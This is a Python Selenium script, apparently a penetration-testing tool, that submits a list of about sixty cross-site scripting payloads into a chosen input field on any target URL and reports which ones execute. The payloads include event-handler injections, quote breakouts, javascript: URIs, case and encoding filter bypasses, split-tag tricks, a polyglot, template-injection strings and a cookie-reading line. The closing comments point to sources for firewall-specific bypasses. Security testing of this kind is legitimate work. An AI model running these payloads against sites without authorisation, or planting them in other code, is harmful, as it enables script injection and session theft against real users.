from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoAlertPresentException, UnexpectedAlertPresentException
import time
payloads = [
     # --- Basic execution ---
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(window.origin)</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",

    # --- Event-handler based (work when <script> is stripped/inert) ---
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<iframe onload=alert(1)>",

    # --- Attribute / quote breakout (for when payload lands inside an attribute) ---
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><img src=x onerror=alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    "' onmouseover=alert(1) x='",
    "\" autofocus onfocus=alert(1) x=\"",

    # --- javascript: URI (for href/src-type sinks) ---
    "<a href=javascript:alert(1)>click</a>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "javascript:alert(document.cookie)",

    # --- Case / obfuscation bypass (for naive filters) ---
    "<ScRiPt>alert(1)</sCrIpT>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<img src=x OnErRoR=alert(1)>",
    "<img src=x onerror=\u0061lert(1)>",

    # --- Without parentheses / without spaces (bypasses naive blacklist filters) ---
    "<img src=x onerror=alert`1`>",
    "<svg/onload=alert`1`>",
    "<img/src=x/onerror=alert(1)>",
    "<svg%0Aonload=alert(1)>",
    "<img src=x onerror=\talert(1)>",

    # --- Encoding tricks ---
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<img src=x onerror=&#97;lert(1)>",
    "<script>\\u0061lert(1)</script>",

    # --- Broken/partial tag tricks (bypass regex-based filters expecting full tags) ---
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>alert(1)//<</script>",
    "<img src=`x`onerror=alert(1)>",

    # --- No-alert, visible/detectable side effects (good when alert() is blocked by CSP but injection still works) ---
    "<script>document.title='XSS-POC'</script>",
    "<script>document.body.style.background='red'</script>",
    "<plaintext>",
    "<script>document.write('XSS-POC')</script>",
    "<script>document.getElementById('xsspoc')?.remove()</script>",

    # --- Polyglot (tries to work across multiple contexts at once) ---
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
    "\"><svg onload=alert(String.fromCharCode(88,83,83))>",

    # --- DOM clobbering / template-injection style (useful against React/Vue/Angular sinks) ---
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "<img src=x:alert(alt) onerror=eval(src) alt=1>",
]


def test_input_field(driver, url, input_id, button_selector, payload, original_value, wait=0.5):
    driver.get(url)
    time.sleep(wait)

    field = driver.find_element(By.ID, input_id)
    field.clear()
    field.send_keys(payload)

    button = driver.find_element(By.CSS_SELECTOR, button_selector)
    button.click()
    time.sleep(wait)

    executed = False

    try:
        alert = driver.switch_to.alert
        alert.accept()
        executed = True
    except (NoAlertPresentException, UnexpectedAlertPresentException):
       pass

    driver.get(url)
    time.sleep(wait)
    field = driver.find_element(By.ID, input_id)
    field.clear()
    field.send_keys(original_value)
    driver.find_element(By.CSS_SELECTOR, button_selector).click()
    time.sleep(wait)
    return executed

def run_tests(url, input_id, button_selector):
    options = webdriver.ChromeOptions()
    options.add_argument("--headless=new")
    driver = webdriver.Chrome(options=options)

    driver.get(url)
    time.sleep(0.5)
    field = driver.find_element(By.ID, input_id)
    original_value = field.get_attribute("value")
    print(f"Saved original value: {original_value!r}")


    result = []
    for payload in payloads:
        try:
            success = test_input_field(driver, url, input_id, button_selector, payload, original_value)
        except Exception as e:
            print(f"error testing payload: {payload} -> {e}")
            success = False
        status = "Executed" if success else "No alert"
        print(f"{status} | {payload}")
        result.append((payload, success))
    driver.quit()
    return result

import argparse

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Test XSS payloads against an input fields")
    parser.add_argument("--url", "-u", required=True, help="Target page URL")
    parser.add_argument("--input-id", "-i", required=True, help="HTML id of the input field (no #) you want to inject the payload in it")
    parser.add_argument("--button",  "-b", required=True, help="CSS selector for the submit button")
    # add the wait seconds later, and if you want it headless or no
    args = parser.parse_args()

    run_tests(args.url, args.input_id, args.button)


    # make the payload can be chosen from a word list or external file
    # Reference lists worth pulling more from (all public, maintained, categorized by context): PortSwigger’s XSS cheat sheet,
    #  and PayloadsAllTheThings’ XSS Injection folder on GitHub — both are the standard references pentesters use 
    # and go well beyond this list into WAF-specific bypasses (Cloudflare, Akamai, etc.) if you end up needing those.
    